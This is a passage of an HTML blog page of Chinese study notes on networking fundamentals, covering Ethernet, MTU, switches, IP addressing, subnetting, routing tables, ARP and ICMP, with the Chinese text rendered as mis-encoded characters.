href="#4-ç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨-Cable-Modem" class="headerlink" title="4. ç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨ (Cable Modem)"></a>4. ç”µç¼†è°ƒåˆ¶è§£è°ƒå™¨ (Cable Modem)</h4><h3 id="2-2-2-å±€åŸŸç½‘ä½¿ç”¨çš„è®¾å¤‡-â€“-ä»¥å¤ªç½‘"><a href="#2-2-2-å±€åŸŸç½‘ä½¿ç”¨çš„è®¾å¤‡-â€“-ä»¥å¤ªç½‘" class="headerlink" title="2.2.2 å±€åŸŸç½‘ä½¿ç”¨çš„è®¾å¤‡ â€“ ä»¥å¤ªç½‘"></a>2.2.2 å±€åŸŸç½‘ä½¿ç”¨çš„è®¾å¤‡ â€“ ä»¥å¤ªç½‘</h3><p>æ•´ä¸ªç½‘ç»œä¸–ç•Œå¹¶éä»…æœ‰ä»¥å¤ªç½‘è¿™ä¸ªç¡¬ä»¶æ¥å£.</p><h4 id="1-ä»¥å¤ªç½‘çš„é€Ÿåº¦ä¸æ ‡å‡†"><a href="#1-ä»¥å¤ªç½‘çš„é€Ÿåº¦ä¸æ ‡å‡†" class="headerlink" title="1. ä»¥å¤ªç½‘çš„é€Ÿåº¦ä¸æ ‡å‡†"></a>1. ä»¥å¤ªç½‘çš„é€Ÿåº¦ä¸æ ‡å‡†</h4><p>ä»¥å¤ªç½‘æ ‡å‡†ä¸º 802.3 çš„ IEEE 10BASE5, ä¸»è¦å®šä¹‰ä¸º: 10 ä»£è¡¨ä¼ è¾“æ•°æ®ä¸º 10 Mbps, BASE è¡¨ç¤ºé‡‡ç”¨åŸºå¸¦ä¿¡å·æ¥è¿›è¡Œä¼ è¾“, è‡³äº 5 åˆ™æ˜¯æŒ‡æ¯ä¸ªç½‘ç»œèŠ‚ç‚¹ä¹‹é—´æœ€é•¿å¯è¾¾ 500 ç±³.</p><p>ç½‘ç»œä¼ è¾“çš„ä¿¡æ¯å°±æ˜¯ 0 å’Œ 1.</p><p>ä¸€èˆ¬çš„ 2Mbps&#x2F;128Kbps æŒ‡çš„æ˜¯ bit çš„ä¼ è¾“è€Œä¸æ˜¯ byte, å› æ­¤è¦é™¤ä»¥ 8.</p><p>ä½¿ç”¨å››å¯¹ç»çº¿çš„ç½‘çº¿,ä¹Ÿå°±æ˜¯å¸¸è§çš„ 8 è•Šç½‘çº¿, è¿™ç§ç½‘çº¿å¸¸è¢«ç§°ä¸ºäº”ç±» (Category 5) çš„ç½‘çº¿.</p><p>æå‡ä¼ è¾“é€Ÿåº¦, å’Œç½‘çº¿æå¤§ç›¸å…³.</p><h4 id="2-ä»¥å¤ªç½‘çš„ç½‘çº¿æ¥å¤´-äº¤å‰-x2F-ç›´è¿çº¿"><a href="#2-ä»¥å¤ªç½‘çš„ç½‘çº¿æ¥å¤´-äº¤å‰-x2F-ç›´è¿çº¿" class="headerlink" title="2. ä»¥å¤ªç½‘çš„ç½‘çº¿æ¥å¤´ (äº¤å‰&#x2F;ç›´è¿çº¿)"></a>2. ä»¥å¤ªç½‘çš„ç½‘çº¿æ¥å¤´ (äº¤å‰&#x2F;ç›´è¿çº¿)</h4><p>ç›®å‰åœ¨ä»¥å¤ªç½‘ä¸Šæœ€å¸¸è§åˆ°çš„æ¥å¤´å°±æ˜¯ RJ-45 çš„ç½‘ç»œæ¥å¤´.</p><h3 id="2-2-3-ä»¥å¤ªç½‘ç»œçš„ä¼ è¾“åè®®-CSMA-x2F-CD"><a href="#2-2-3-ä»¥å¤ªç½‘ç»œçš„ä¼ è¾“åè®®-CSMA-x2F-CD" class="headerlink" title="2.2.3 ä»¥å¤ªç½‘ç»œçš„ä¼ è¾“åè®®: CSMA&#x2F;CD"></a>2.2.3 ä»¥å¤ªç½‘ç»œçš„ä¼ è¾“åè®®: CSMA&#x2F;CD</h3><p>æ•´ä¸ªä»¥å¤ªç½‘çš„é‡å¿ƒå°±æ˜¯ä»¥å¤ªç½‘å¡.</p><p>ä»¥å¤ªç½‘çš„ä¼ è¾“ä¸»è¦å°±æ˜¯ç½‘å¡å¯¹ç½‘å¡ä¹‹é—´çš„æ•°æ®ä¼ è¾“.</p><p>æ¯å¼ ç½‘å¡éƒ½æœ‰ä¸€ä¸ªç‹¬ä¸€æ— äºŒçš„ç¼–å·, å³ MAC (Media Access Control).   </p><p><mark>é›†çº¿å™¨æ˜¯ä¸€ç§ç½‘ç»œå…±äº«ä»‹è´¨è®¾å¤‡</mark>, å³,ç½‘ç»œå…±äº«ä»‹è´¨åœ¨å•ä¸€æ—¶é—´ç‚¹å†…, ä»…èƒ½è¢«ä¸€å°ä¸»æœºæ‰€ä½¿ç”¨.</p><p>ä¸ç®¡å“ªä¸€å°ä¸»æœºå‘é€å‡ºæ•°æ®å¸§, æ‰€æœ‰è®¡ç®—æœºéƒ½ä¼šæ¥æ”¶åˆ°.</p><h3 id="2-2-4-MAC-çš„å°è£…æ ¼å¼"><a href="#2-2-4-MAC-çš„å°è£…æ ¼å¼" class="headerlink" title="2.2.4 MAC çš„å°è£…æ ¼å¼"></a>2.2.4 MAC çš„å°è£…æ ¼å¼</h3><p>åœ¨ Linux å½“ä¸­,å¯ä»¥ä½¿ç”¨ ifconfig å‘½ä»¤æ¥æŸ¥çœ‹ç½‘å¡å¡å·.</p><p>æ•°æ®åŒ…ä¸Šçš„ MAC åœ°å€ä¼šå˜åŒ–.</p><p>é˜²ç«å¢™è½¯ä»¶å¤§å¤šä¹Ÿèƒ½å¤Ÿé’ˆå¯¹ç½‘å¡æ¥è¿›è¡Œç­–ç•¥çš„å®šä¹‰. ä¸è¿‡é’ˆå¯¹ç½‘å¡çš„é™åˆ¶ä»…èƒ½åœ¨å±€åŸŸç½‘å†…è¿›è¡Œ, å› ä¸º MAC ä¸èƒ½è·¨ Router.</p><p>æ•°æ®é‡æœ€å°éœ€è¦æœ‰ 46 bytes.</p><h3 id="2-2-5-MUT-æœ€å¤§ä¼ è¾“å•ä½"><a href="#2-2-5-MUT-æœ€å¤§ä¼ è¾“å•ä½" class="headerlink" title="2.2.5 MUT (æœ€å¤§ä¼ è¾“å•ä½)"></a>2.2.5 MUT (æœ€å¤§ä¼ è¾“å•ä½)</h3><p>ä»¥å¤ªç½‘æ•°æ®å¸§æ‰€èƒ½ä¼ é€çš„æ•°æ®é‡æœ€å¤§å¯ä»¥è¾¾åˆ° 1500 bytes, è¿™ä¸ªæ•°å€¼å°±è¢«ç§°ä¸º MTU (Maximum Transmission Unit, æœ€å¤§ä¼ è¾“å•å…ƒ).</p><p>æ¯ç§ç½‘ç»œæ¥å£çš„ MTU éƒ½ä¸åŒ.</p><p>ä¸è®ºä½ çš„ç½‘ç»œåª’ä½“æ”¯æŒçš„ MTU æœ‰å¤šå¤§, ä½ å¿…é¡»è€ƒè™‘åˆ°ä½ çš„æ•°æ®åŒ…éœ€è¦ä¼ åˆ°ç›®çš„åœ°æ—¶, æ‰€éœ€è¦ç»è¿‡çš„æ‰€æœ‰ç½‘ç»œè®¾å¤‡,ç„¶ååœ¨æ¥å†³å®šä½ çš„ MTU é…ç½®.</p><h3 id="2-2-6-é›†çº¿å™¨-äº¤æ¢å™¨ä¸ç›¸å…³æœºåˆ¶"><a href="#2-2-6-é›†çº¿å™¨-äº¤æ¢å™¨ä¸ç›¸å…³æœºåˆ¶" class="headerlink" title="2.2.6 é›†çº¿å™¨, äº¤æ¢å™¨ä¸ç›¸å…³æœºåˆ¶"></a>2.2.6 é›†çº¿å™¨, äº¤æ¢å™¨ä¸ç›¸å…³æœºåˆ¶</h3><h4 id="1-å…±ä¸å…±äº«å¾ˆé‡è¦-é›†çº¿å™¨è¿˜æ˜¯äº¤æ¢å™¨"><a href="#1-å…±ä¸å…±äº«å¾ˆé‡è¦-é›†çº¿å™¨è¿˜æ˜¯äº¤æ¢å™¨" class="headerlink" title="1. å…±ä¸å…±äº«å¾ˆé‡è¦, é›†çº¿å™¨è¿˜æ˜¯äº¤æ¢å™¨"></a>1. å…±ä¸å…±äº«å¾ˆé‡è¦, é›†çº¿å™¨è¿˜æ˜¯äº¤æ¢å™¨</h4><p>äº¤æ¢å™¨ (switch) æ˜¯éå…±äº«çš„, å…¶ä¸ä¼šæœ‰å†²çª.</p><p>äº¤æ¢å™¨ä¸é›†çº¿å™¨æœ€å¤§çš„å·®å¼‚, åœ¨äºäº¤æ¢å™¨å†…æœ‰ä¸€ä¸ªç‰¹åˆ«çš„å†…å­˜, è¿™ä¸ªå†…å­˜å¯ä»¥è®°å½•æ¯ä¸ª Switch port ä¸å…¶è¿æ¥çš„ PC çš„ MAC åœ°å€.</p><p>å½“æ¥è‡ª Switch ä¸¤ç«¯çš„ PC è¦äº’ä¼ æ•°æ®æ—¶, æ¯ä¸ªæ•°æ®å¸§å°†ç›´æ¥é€šè¿‡äº¤æ¢å™¨çš„å†…å­˜æ•°æ®è€Œä¼ é€åˆ°ç›®æ ‡ä¸»æœºä¸Š, Switch çš„æ¯ä¸ªç«¯å£ (port) éƒ½æœ‰ç‹¬ç«‹çš„å¸¦å®½.</p><p>Switch å·²ç»å…‹æœäº†æ•°æ®åŒ…å†²çªçš„é—®é¢˜, å› ä¸º Switch port æœ‰å¯¹åº” MAC çš„ç›¸å…³åŠŸèƒ½.</p><p>åœ¨é€‰è´­çš„æ—¶å€™, é€‰æ‹©æ”¯æŒå…¨åŒå·¥&#x2F;åŠåŒå·¥, ä»¥åŠæ”¯æŒ Jumbo frame çš„ä¸ºä½³.</p><h4 id="2-ä»€ä¹ˆæ˜¯å…¨åŒå·¥-x2F-åŠåŒå·¥-full-dumplex-x2F-half-dumplex"><a href="#2-ä»€ä¹ˆæ˜¯å…¨åŒå·¥-x2F-åŠåŒå·¥-full-dumplex-x2F-half-dumplex" class="headerlink" title="2. ä»€ä¹ˆæ˜¯å…¨åŒå·¥&#x2F;åŠåŒå·¥ (full-dumplex&#x2F;half-dumplex)"></a>2. ä»€ä¹ˆæ˜¯å…¨åŒå·¥&#x2F;åŠåŒå·¥ (full-dumplex&#x2F;half-dumplex)</h4><h4 id="3-è‡ªåŠ¨åè°ƒé€Ÿåº¦æœºåˆ¶-auto-negotiation"><a href="#3-è‡ªåŠ¨åè°ƒé€Ÿåº¦æœºåˆ¶-auto-negotiation" class="headerlink" title="3. è‡ªåŠ¨åè°ƒé€Ÿåº¦æœºåˆ¶ (auto-negotiation)"></a>3. è‡ªåŠ¨åè°ƒé€Ÿåº¦æœºåˆ¶ (auto-negotiation)</h4><p>å¯è‡ªåŠ¨åè°ƒå‡ºæœ€é«˜çš„ä¼ è¾“é€Ÿåº¦æ¥é€šä¿¡.</p><h4 id="4-è‡ªåŠ¨åˆ†è¾¨ç½‘çº¿çš„äº¤å‰æˆ–ç›´è¿æ¥å£-Auto-MDI-x2F-MDIX"><a href="#4-è‡ªåŠ¨åˆ†è¾¨ç½‘çº¿çš„äº¤å‰æˆ–ç›´è¿æ¥å£-Auto-MDI-x2F-MDIX" class="headerlink" title="4. è‡ªåŠ¨åˆ†è¾¨ç½‘çº¿çš„äº¤å‰æˆ–ç›´è¿æ¥å£ (Auto MDI&#x2F;MDIX)"></a>4. è‡ªåŠ¨åˆ†è¾¨ç½‘çº¿çš„äº¤å‰æˆ–ç›´è¿æ¥å£ (Auto MDI&#x2F;MDIX)</h4><p>è‡ªåŠ¨åˆ†è¾¨ç½‘çº¿çš„æ¥å£æ¥è°ƒæ•´è¿æ¥.</p><h2 id="2-3-TCP-x2F-IP-çš„ç½‘ç»œæ›¾ç›¸å…³æ•°æ®åŒ…ä¸æ•°æ®"><a href="#2-3-TCP-x2F-IP-çš„ç½‘ç»œæ›¾ç›¸å…³æ•°æ®åŒ…ä¸æ•°æ®" class="headerlink" title="2.3 TCP&#x2F;IP çš„ç½‘ç»œæ›¾ç›¸å…³æ•°æ®åŒ…ä¸æ•°æ®"></a>2.3 TCP&#x2F;IP çš„ç½‘ç»œæ›¾ç›¸å…³æ•°æ®åŒ…ä¸æ•°æ®</h2><h3 id="2-3-1-IP-æ•°æ®åŒ…çš„å°è£…"><a href="#2-3-1-IP-æ•°æ®åŒ…çš„å°è£…" class="headerlink" title="2.3.1 IP æ•°æ®åŒ…çš„å°è£…"></a>2.3.1 IP æ•°æ®åŒ…çš„å°è£…</h3><h3 id="2-3-2-IP-åœ°å€çš„ç»„æˆä¸åˆ†çº§"><a href="#2-3-2-IP-åœ°å€çš„ç»„æˆä¸åˆ†çº§" class="headerlink" title="2.3.2 IP åœ°å€çš„ç»„æˆä¸åˆ†çº§"></a>2.3.2 IP åœ°å€çš„ç»„æˆä¸åˆ†çº§</h3><p>å°† 32 bits çš„ IP åˆ†æˆå››å°æ®µ, æ¯æ®µå«æœ‰ 8 ä¸ª bits, å°† 8 ä¸ª bits æ¢ç®—æˆåè¿›åˆ¶.</p><p>IP åˆåˆ†ä¸º:</p><ul><li>Net_ID, ç½‘ç»œå·ç , å‰é¢ä¸‰ç»„æ•°å­—</li><li>Host_ID, ä¸»æœºå·ç , åé¢ä¸€ç»„æ•°å­—</li></ul><p>å¯¹äºåŒä¸€ä¸ªç½‘ç»œçš„å®šä¹‰æ˜¯ â€“ åœ¨åŒä¸€ä¸ªç‰©ç†ç½‘æ®µå†…, ä¸»æœºçš„ IP å…·æœ‰ç›¸åŒçš„ Net_ID, å¹¶ä¸”å…·æœ‰ç‹¬ç‰¹çš„ Host_ID.</p><h4 id="1-IP-åœ¨åŒä¸€ç½‘ç»œçš„æ„ä¹‰"><a href="#1-IP-åœ¨åŒä¸€ç½‘ç»œçš„æ„ä¹‰" class="headerlink" title="1. IP åœ¨åŒä¸€ç½‘ç»œçš„æ„ä¹‰"></a>1. IP åœ¨åŒä¸€ç½‘ç»œçš„æ„ä¹‰</h4><h5 id="Net-ID-ä¸-Host-ID-çš„é™åˆ¶"><a href="#Net-ID-ä¸-Host-ID-çš„é™åˆ¶" class="headerlink" title="Net_ID ä¸ Host_ID çš„é™åˆ¶"></a>Net_ID ä¸ Host_ID çš„é™åˆ¶</h5><p>åœ¨åŒä¸€ä¸ªç½‘æ®µå†…, Net_ID æ˜¯ä¸å˜çš„, è€Œ Host_ID åˆ™æ˜¯ä¸å¯é‡å¤çš„.</p><p>Host_ID åœ¨äºŒè¿›åˆ¶çš„è¡¨ç¤ºæ³•ä¸­, ä¸å¯åŒæ—¶ä¸º 0, ä¹Ÿä¸å¯åŒæ—¶ä¸º 1.</p><p>Host_ID å…¨ä¸º 0 è¡¨ç¤ºæ•´ä¸ªç½‘æ®µçš„åœ°å€ (Network IP). å…¨ä¸º 1 åˆ™è¡¨ç¤ºä¸ºå¹¿æ’­çš„åœ°å€ (Broadcast IP).</p><h5 id="åœ¨å±€åŸŸç½‘å†…é€šè¿‡-IP-å¹¿æ’­ä¼ é€’æ•°æ®"><a href="#åœ¨å±€åŸŸç½‘å†…é€šè¿‡-IP-å¹¿æ’­ä¼ é€’æ•°æ®" class="headerlink" title="åœ¨å±€åŸŸç½‘å†…é€šè¿‡ IP å¹¿æ’­ä¼ é€’æ•°æ®"></a>åœ¨å±€åŸŸç½‘å†…é€šè¿‡ IP å¹¿æ’­ä¼ é€’æ•°æ®</h5><p>åŒä¸€ä¸ªç½‘æ®µå†…, å¯ç›´æ¥ç”¨ MAC åœ°å€äº¤æµ.</p><h4 id="2-IP-ä¸é—¨ç‰Œå·ç çš„è”æƒ³"><a href="#2-IP-ä¸é—¨ç‰Œå·ç çš„è”æƒ³" class="headerlink" title="2. IP ä¸é—¨ç‰Œå·ç çš„è”æƒ³"></a>2. IP ä¸é—¨ç‰Œå·ç çš„è”æƒ³</h4><h4 id="3-IP-çš„åˆ†çº§"><a href="#3-IP-çš„åˆ†çº§" class="headerlink" title="3. IP çš„åˆ†çº§"></a>3. IP çš„åˆ†çº§</h4><p>IP ç½‘æ®µåˆ†ä¸º 5 ä¸ªç­‰çº§, æ¯ç§ç­‰çº§çš„èŒƒå›´ä¸»è¦ä¸ IP çš„ 32 bits æ•°å€¼çš„å‰é¢å‡ ä¸ªä½æœ‰å…³.</p><h3 id="2-3-3-IP-çš„ç§ç±»ä¸å–å¾—æ–¹å¼"><a href="#2-3-3-IP-çš„ç§ç±»ä¸å–å¾—æ–¹å¼" class="headerlink" title="2.3.3 IP çš„ç§ç±»ä¸å–å¾—æ–¹å¼"></a>2.3.3 IP çš„ç§ç±»ä¸å–å¾—æ–¹å¼</h3><p>åœ¨ IPv4 é‡Œé¢å°±åªæœ‰ä¸¤ç§ IP çš„ç±»åˆ«:</p><ul><li>Public IP : å…¬å…± IP, ç»ç”± Inter NIC æ‰€ç»Ÿä¸€è§„åˆ’çš„ IP, è¿™ç§ IP æ‰èƒ½è¿æ¥ Internet</li><li>Private IP : ç§æœ‰æˆ–ä¿ç•™ IP, ä¸èƒ½ç›´æ¥è¿ä¸Š Internet çš„ IP, ä¸»è¦ç”¨äºå±€åŸŸç½‘æ ¼å†…çš„ä¸»æœºè¿æ¥è§„åˆ’</li></ul><p>ç§æœ‰ IP åˆ†åˆ«åœ¨ A, B, C ä¸‰ä¸ª Class å½“ä¸­å„ä¿ç•™ä¸€æ®µä½œä¸ºç§æœ‰ IP ç½‘æ®µ.</p><p>åœ¨é˜²ç«å¢™ä¸ŠåŠ ä¸Š NAT (Network Address Transfer) æœåŠ¡, å¯ä»¥é€šè¿‡ä¼ªè£… IP æ¥ä½¿ç§æœ‰ IP çš„è®¡ç®—æœºæ¥è¿ä¸Š Internete.</p><h4 id="1-ç‰¹æ®Šçš„-Loopback-IP-ç½‘æ®µ"><a href="#1-ç‰¹æ®Šçš„-Loopback-IP-ç½‘æ®µ" class="headerlink" title="1. ç‰¹æ®Šçš„ Loopback IP ç½‘æ®µ"></a>1. ç‰¹æ®Šçš„ Loopback IP ç½‘æ®µ</h4><p>å³ lo ç½‘ç»œ,ç”¨æ¥æµ‹è¯•æ“ä½œç³»ç»Ÿå†…éƒ¨å¾ªç¯æ‰€ç”¨çš„ä¸€ä¸ªç½‘ç»œ, åŒæ—¶ä¹Ÿèƒ½å¤Ÿæä¾›ç»™ç³»ç»Ÿå†…éƒ¨åŸæœ¬å°±éœ€è¦ä½¿ç”¨ç½‘ç»œæ¥å£çš„æœåŠ¡ (daemon) æ‰€ä½¿ç”¨.</p><p>è¿™ä¸ªç½‘æ®µåœ¨ 127.0.0.0&#x2F;8 è¿™ä¸ª class A, é»˜è®¤çš„ä¸»æœº IP ä¸º 127.0.0.1, å¯ç”¨æ¥æµ‹è¯•ç½‘ç«™. ç”¨ <code>http://localhost</code>.</p><h4 id="2-IP-çš„å–å¾—æ–¹å¼"><a href="#2-IP-çš„å–å¾—æ–¹å¼" class="headerlink" title="2. IP çš„å–å¾—æ–¹å¼"></a>2. IP çš„å–å¾—æ–¹å¼</h4><ul><li>ç›´æ¥æ‰‹åŠ¨é…ç½® (static)</li><li>é€šè¿‡æ‹¨å·å–å¾—</li><li>è‡ªåŠ¨å–å¾—ç½‘ç»œå‚æ•° (DHCP)</li></ul><h3 id="2-3-4-Netmask-å­ç½‘ä¸CIDR-Classless-Interdomain-Routing"><a href="#2-3-4-Netmask-å­ç½‘ä¸CIDR-Classless-Interdomain-Routing" class="headerlink" title="2.3.4 Netmask, å­ç½‘ä¸CIDR (Classless Interdomain Routing)"></a>2.3.4 Netmask, å­ç½‘ä¸CIDR (Classless Interdomain Routing)</h3><h4 id="1-Netmask"><a href="#1-Netmask" class="headerlink" title="1. Netmask"></a>1. Netmask</h4><p>Netmask åˆç§° Subnet mask, å³å­ç½‘æ©ç . ç”¨æ¥å®ç°å­ç½‘çš„åˆ’åˆ†.</p><h4 id="2-å­ç½‘åˆ’åˆ†"><a href="#2-å­ç½‘åˆ’åˆ†" class="headerlink" title="2. å­ç½‘åˆ’åˆ†"></a>2. å­ç½‘åˆ’åˆ†</h4><p>æ ¹æ® 24 ä½æ¥åˆ¤æ–­æœ‰å‡ ä¸ªç½‘æ®µ, å¦‚ Net_ID ä¸º 26 ä½, å³ 26 - 24 &#x3D; 2, æœ‰ $2^2$ å³ 4 ä¸ªç½‘æ®µ.</p><h4 id="3-æ— ç±»åˆ«åŸŸé—´è·¯ç”±-CIDR-Class-Interdomain-Routing"><a href="#3-æ— ç±»åˆ«åŸŸé—´è·¯ç”±-CIDR-Class-Interdomain-Routing" class="headerlink" title="3. æ— ç±»åˆ«åŸŸé—´è·¯ç”± CIDR (Class Interdomain Routing)"></a>3. æ— ç±»åˆ«åŸŸé—´è·¯ç”± CIDR (Class Interdomain Routing)</h4><h3 id="2-3-5-è·¯ç”±æ¦‚å¿µ"><a href="#2-3-5-è·¯ç”±æ¦‚å¿µ" class="headerlink" title="2.3.5 è·¯ç”±æ¦‚å¿µ"></a>2.3.5 è·¯ç”±æ¦‚å¿µ</h3><p>åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…, å¯ä»¥é€šè¿‡ IP å¹¿æ’­çš„æ–¹å¼æ¥å®ç°æ•°æ®ä¼ é€’çš„ç›®çš„.</p><p>ä¸åŒç½‘æ®µä¹‹é—´é€šè¿‡è·¯ç”±å™¨ä¼ é€’æ•°æ®.</p><p>æ¯å°ä¸»æœºéƒ½æœ‰è‡ªå·±çš„ <mark>è·¯ç”±è¡¨</mark>. æ•°æ®çš„ä¼ é€’å°†ä¾æ®è¿™ä¸ªè·¯ç”±è¡¨è¿›è¡Œä¼ é€.</p><p><mark>ç½‘å…³&#x2F;è·¯ç”±</mark>, Gateway&#x2F;Router çš„åŠŸèƒ½å°±æ˜¯è´Ÿè´£ä¸åŒç½‘ç»œä¹‹é—´çš„æ•°æ®åŒ…ä¼ é€’ (IP Forwarding). æ‰€ä»¥ç½‘å…³å’Œè·¯ç”±ä¼¼ä¹å¯ä»¥ç­‰ä»·.</p><h3 id="2-3-6-è§‚å¯Ÿä¸»æœºè·¯ç”±-Route"><a href="#2-3-6-è§‚å¯Ÿä¸»æœºè·¯ç”±-Route" class="headerlink" title="2.3.6 è§‚å¯Ÿä¸»æœºè·¯ç”±: Route"></a>2.3.6 è§‚å¯Ÿä¸»æœºè·¯ç”±: Route</h3><p>è·¯ç”±ä¸€æ—¦è®¾ç½®é”™è¯¯, å°†ä¼šå¯¼è‡´æŸäº›æ•°æ®åŒ…å®Œå…¨æ— æ³•æ­£ç¡®çš„é€å‡ºå».</p><p>è§‚å¯Ÿè·¯ç”±è¡¨çš„å‘½ä»¤:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">route</span><span class="hljs-meta"> [-n]</span><br></code></pre></td></tr></table></figure><p><code>-n</code> æ˜¯å°†ä¸»æœºåä»¥ IP çš„æ–¹å¼æ˜¾ç¤º.</p><p>è¾“å‡ºä¸­çš„ Destination å°±æ˜¯ Network, è¡¨ç¤ºç½‘ç»œ.</p><p>Gateway é‚£ä¸€æ ä¸º <code>0.0.0.0</code> è¡¨ç¤ºä¸éœ€è¦é€šè¿‡ Gateway ä¼ æ’­, è€Œæ˜¯ç›´æ¥ä» Iface æ¥å£å‘é€.</p><p>è‹¥è¦ä¼ é€çš„æ•°æ®åŒ…ç›®çš„åœ° IP ä¸å†è·¯ç”±è§„åˆ™é‡Œ, é‚£ä¹ˆæ•°æ®åŒ…å°±ä¼šè¢«ä¼ é€åˆ° â€œdefaultâ€ æ‰€åœ¨çš„è·¯ç”±è§„åˆ™.<br>è¾“å‡ºä¸­çš„ <code>Flags</code>, æœ‰å¤šä¸ªæ ‡å¿—å¯ä»¥æ¥è¡¨ç¤ºè¯¥ç½‘ç»œæˆ–ä¸»æœºä»£è¡¨çš„æ„ä¹‰:</p><ul><li>U : ä»£è¡¨è¯¥è·¯ç”±å¯ç”¨</li><li>G : ä»£è¡¨è¯¥ç½‘ç»œéœ€è¦ç»ç”± Gateway æ¥å¸®å¿™ä¼ é€’</li><li>H : ä»£è¡¨è¯¥è¡Œè·¯ç”±ä¸ºä¸€å°ä¸»æœº, è€Œéä¸€æ•´ä¸ªç½‘ç»œ</li></ul><h3 id="2-3-7-IP-ä¸-MAC-ç½‘ç»œæ¥å£å±‚çš„-ARP-ä¸-RARP-åè®®"><a href="#2-3-7-IP-ä¸-MAC-ç½‘ç»œæ¥å£å±‚çš„-ARP-ä¸-RARP-åè®®" class="headerlink" title="2.3.7 IP ä¸ MAC: ç½‘ç»œæ¥å£å±‚çš„ ARP ä¸ RARP åè®®"></a>2.3.7 IP ä¸ MAC: ç½‘ç»œæ¥å£å±‚çš„ ARP ä¸ RARP åè®®</h3><p>ARP (Address Resolution Protocol, ç½‘ç»œåœ°å€è§£æ) åè®®.</p><p>RARP (Revers ARP, åå‘ç½‘ç»œåœ°å€è§£æ).</p><p>å½“æˆ‘ä»¬æƒ³äº†è§£æŸä¸ª IP é…ç½®åœ¨å“ªå¼ ä»¥å¤ªç½‘å¡ä¸Šæ—¶, æˆ‘ä»¬çš„ä¸»æœºå°±ä¼šå¯¹æ•´ä¸ªå±€åŸŸç½‘å‘é€å‡º ARP æ•°æ®åŒ…, å¯¹æ–¹æ”¶åˆ° ARP æ•°æ®åŒ…åå°±ä¼šè¿”å›å®ƒçš„ MAC.</p><p>å½“ ARP åè®®å–å¾—ç›®æ ‡ IP ä¸å®ƒçš„ç½‘å¡å¡å·å, å°±ä¼šå°†è¯¥ç¬”è®°å½•å†™å…¥ä¸»æœºçš„ ARP table ä¸­, è®°å½• 20 åˆ†é’Ÿ.</p><p>å–å¾—ç½‘å¡å¡å· (MAC):</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure><p>å–å¾— ARP è¡¨æ ¼å†…çš„ IP&#x2F;MAC å¯¹åº”æ•°æ®:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">arp -<span class="hljs-selector-attr">[nd]</span> hostname<br></code></pre></td></tr></table></figure><p>å‚æ•°ä¸é€‰é¡¹:</p><ul><li><code>-n</code> : å°†ä¸»æœºåä»¥ IP çš„å½¢æ€æ˜¾ç¤º</li><li><code>-d</code> : delete, å°† hostname çš„ hardware_address ç”± ARP table ä¸­åˆ æ‰</li><li><code>-s</code> : set, è®¾å®šæŸä¸ª IP æˆ– hostname çš„ MAC åˆ° ARP table å½“ä¸­</li></ul><h3 id="2-3-8-ICMP-åè®®"><a href="#2-3-8-ICMP-åè®®" class="headerlink" title="2.3.8 ICMP åè®®"></a>2.3.8 ICMP åè®®</h3><p>Internet Control Message Protocol, å› ç‰¹ç½‘ä¿¡æ¯æ§åˆ¶åè®®.</p><p>å…¶æœ€å¤§åŠŸèƒ½å°±æ˜¯ç¡®ä¿æˆ‘ä»¬ç½‘ç»œçš„è¿æ¥çŠ¶æ€ä¸è¿æ¥çš„æ­£ç¡®æ€§.</p><p>åˆ©ç”¨ ICMP æ¥æ£€éªŒç½‘ç»œçŠ¶æ€æœ€ç®€å•çš„å‘½ä»¤å°±æ˜¯ <code>ping</code> ä¸ <code>traceroute</code>.</p><h2 id="2-4-TCP-x2F-IP-çš„ä¼ è¾“å±‚ç›¸å…³æ•°æ®åŒ…ä¸æ•°æ®"><a href="#2-4-TCP-x2F-IP-çš„ä¼ è¾“å±‚ç›¸å…³æ•°æ®åŒ…ä¸æ•°æ®" class="headerlink" title="2.4 TCP&#x2F;IP çš„ä¼ è¾“å±‚ç›¸å…³æ•°æ®åŒ…ä¸æ•°æ®"></a>2.4 TCP&#x2F;IP çš„ä¼ è¾“å±‚ç›¸å…³æ•°æ®åŒ…ä¸æ•°æ®</h2><h3 id="2-4-1-é¢å‘è¿æ¥çš„å¯é çš„-TCP-åè®®"><a href="#2-4-1-é¢å‘è¿æ¥çš„å¯é çš„-TCP-åè®®" class="headerlink" title="2.4.1 é¢å‘è¿æ¥çš„å¯é çš„ TCP åè®®"></a>2.4.1 é¢å‘è¿æ¥çš„å¯é çš„ TCP åè®®</h3><p>IP åœ°å€çš„ä¸¤ç«¯, è¿æ¥çš„æ˜¯ Server å’Œ Clicent çš„ port.</p><h4 id="1-é€šä¿¡ç«¯å£"><a href="#1-é€šä¿¡ç«¯å£" class="headerlink" title="1. é€šä¿¡ç«¯å£"></a>1. é€šä¿¡ç«¯å£</h4><p>æ¥æºä¸ç›®æ ‡çš„ç«¯å£éƒ½æ˜¯ 16 ä½, å…¶åšå¤§å¯è¾¾ 65535 ( $2^16$ ).</p><p>å¯ä»¥é€šè¿‡ port æ¥åˆ¤æ–­åº”ç”¨ç¨‹åº.</p><h4 id="2-ç‰¹æƒç«¯å£-Privileged-Ports"><a href="#2-ç‰¹æƒç«¯å£-Privileged-Ports" class="headerlink" title="2. ç‰¹æƒç«¯å£ (Privileged Ports)"></a>2. ç‰¹æƒç«¯å£ (Privileged Ports)</h4><p>Internet ä¸Šé¢å·²ç»æœ‰å¾ˆå¤šè§„èŒƒå¥½çš„å›ºå®š port (well-known port), è¿™äº› port number é€šå¸¸å°äº 1024.</p><p>å°äº 1024 ä»¥ä¸‹çš„ç«¯å£è¦å¯åŠ¨æ—¶, å¯åŠ¨è€…çš„èº«ä»½å¿…é¡»è¦æ˜¯ root æ‰è¡Œ, æ‰€ä»¥å«åšç‰¹æƒç«¯å£.</p><p>åœ¨ Linux ç¯å¢ƒå†…ä¸‹, å„ç½‘ç»œæœåŠ¡ä¸ port number çš„å¯¹åº”é»˜è®¤å†™åœ¨ <code>/etc/services</code> æ–‡ä»¶å†….</p><h4 id="3-Socket-Pair"><a href="#3-Socket-Pair" class="headerlink" title="3. Socket Pair"></a>3. Socket 